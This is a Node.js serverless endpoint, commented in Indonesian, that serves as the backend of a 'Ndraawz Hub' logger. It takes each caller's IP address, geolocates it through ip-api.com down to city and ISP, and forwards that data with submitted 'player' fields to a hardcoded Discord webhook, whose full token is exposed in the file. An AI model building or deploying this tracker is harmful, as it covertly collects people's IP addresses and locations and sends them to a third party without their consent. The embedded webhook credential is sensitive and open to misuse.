// api/log.js
const https = require('https');
const http = require('http');

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

// Konfigurasi bot Discord
const BOT_USERNAME = "Ndraawz Hub Logger";
const BOT_AVATAR_URL = "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png";
const FOOTER_ICON_URL = "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png";
const EMBED_COLOR = 0x00e5ff; // Biru cyan

// ==========================================
// FUNGSI AMBIL GEOLOKASI (HANYA UNTUK PLAYER LOG)
// ==========================================
function getGeoInfo(ip) {
    return new Promise((resolve) => {
        const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,org,query`;
        
        const timeout = setTimeout(() => {
            console.log(`Timeout untuk IP: ${ip}`);
            resolve(null);
        }, 5000);
        
        http.get(url, (geoRes) => {
            let data = '';
            geoRes.on('data', chunk => data += chunk);
            geoRes.on('end', () => {
                clearTimeout(timeout);
                try {
                    const json = JSON.parse(data);
                    if (json.status === 'success') {
                        console.log(`Geo success untuk ${ip}: ${json.country}`);
                        resolve({
                            country: json.country || "N/A",
                            region: json.regionName || "N/A",
                            city: json.city || "N/A",
                            isp: json.isp || "N/A",
                            as: json.as || "N/A",
                            org: json.org || "N/A"
                        });
                    } else {
                        console.log(`Geo gagal untuk ${ip}: ${json.message || 'unknown'}`);
                        resolve(null);
                    }
                } catch (e) {
                    console.log(`Parse error untuk ${ip}: ${e.message}`);
                    resolve(null);
                }
            });
        }).on('error', (err) => {
            clearTimeout(timeout);
            console.log(`Request error untuk ${ip}: ${err.message}`);
            resolve(null);
        });
    });
}

// ==========================================
// FUNGSI KIRIM EMBED KE DISCORD
// ==========================================
async function sendToDiscord(embed) {
    const payload = JSON.stringify({
        username: BOT_USERNAME,
        avatar_url: BOT_AVATAR_URL,
        embeds: [embed]
    });
    
    const url = new URL(DISCORD_WEBHOOK);
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    
    return new Promise((resolve) => {
        const req = https.request(options, (res) => {
            res.resume();
            resolve(res.statusCode === 204 || res.statusCode === 200);
        });
        req.on('error', () => resolve(false));
        req.write(payload);
        req.end();
    });
}

// ==========================================
// HANDLER UTAMA
// ==========================================
module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // Baca body
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
    });

    // Ambil IP dari header request
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    const cleanIp = clientIp.replace('::ffff:', '');
    console.log(`[LOG] Received from IP: ${cleanIp}`);

    try {
        const data = JSON.parse(body);
        
        // ==========================================
        // TYPE: SECURITY LOG (dari testing.js)
        // ==========================================
        if (data.type === "security") {
            console.log(`[LOG] Security log: ${data.securityType} for IP: ${data.ip || cleanIp}`);
            
            const embed = {
                title: "❗️ Ndraawz Security System ❗️",
                description: data.message,
                color: EMBED_COLOR,
                footer: {
                    text: "Ndraawz Logger System",
                    icon_url: FOOTER_ICON_URL
                },
                timestamp: new Date().toISOString()
            };
            
            await sendToDiscord(embed);
            console.log(`✅ Security log terkirim`);
            return res.status(200).json({ ok: true });
        }
        
        // ==========================================
        // TYPE: PLAYER LOG (dari logger script)
        // ==========================================
        if (data.type === "player" && data.fields) {
            console.log(`[LOG] Player log, fields count: ${data.fields.length}`);
            
            // Ambil geolokasi dari IP
            let geoData = await getGeoInfo(cleanIp);
            
            // Siapkan fields untuk embed
            const allFields = [
                ...(data.fields || []),
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp, inline: false }
            ];
            
            // Tambahkan info geolokasi jika berhasil
            if (geoData) {
                allFields.push(
                    { name: "🚩 Country", value: geoData.country, inline: false },
                    { name: "📍 Region", value: geoData.region, inline: false },
                    { name: "🏙️ City", value: geoData.city, inline: false },
                    { name: "🏢 ISP", value: geoData.isp, inline: false },
                    { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
                );
            } else {
                allFields.push(
                    { name: "⚠️ Info", value: "Geolokasi gagal diambil", inline: false }
                );
            }
            
            const embed = {
                title: "🚀 Ndraawz Logger System",
                color: EMBED_COLOR,
                fields: allFields,
                footer: {
                    text: "Ndraawz Logger System",
                    icon_url: FOOTER_ICON_URL
                },
                timestamp: new Date().toISOString()
            };
            
            await sendToDiscord(embed);
            console.log(`✅ Player log terkirim untuk IP: ${cleanIp}`);
            return res.status(200).json({ ok: true });
        }
        
        // ==========================================
        // FALLBACK: format lama (tanpa type)
        // ==========================================
        if (data.fields) {
            console.log(`[LOG] Fallback log, fields count: ${data.fields.length}`);
            
            let geoData = await getGeoInfo(cleanIp);
            
            const allFields = [
                ...(data.fields || []),
                { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                { name: "📡 IP Address", value: cleanIp, inline: false }
            ];
            
            if (geoData) {
                allFields.push(
                    { name: "🚩 Country", value: geoData.country, inline: false },
                    { name: "📍 Region", value: geoData.region, inline: false },
                    { name: "🏙️ City", value: geoData.city, inline: false },
                    { name: "🏢 ISP", value: geoData.isp, inline: false }
                );
            } else {
                allFields.push(
                    { name: "⚠️ Info", value: "Geolokasi gagal diambil", inline: false }
                );
            }
            
            const embed = {
                title: "🚀 Ndraawz Logger System",
                color: EMBED_COLOR,
                fields: allFields,
                footer: {
                    text: "Ndraawz Logger System",
                    icon_url: FOOTER_ICON_URL
                },
                timestamp: new Date().toISOString()
            };
            
            await sendToDiscord(embed);
            console.log(`✅ Fallback log terkirim untuk IP: ${cleanIp}`);
            return res.status(200).json({ ok: true });
        }
        
        return res.status(400).json({ error: "Invalid request format" });
        
    } catch (err) {
        console.error(`[LOG] Parse error: ${err.message}`);
        res.status(400).json({ error: 'Invalid JSON' });
    }
};
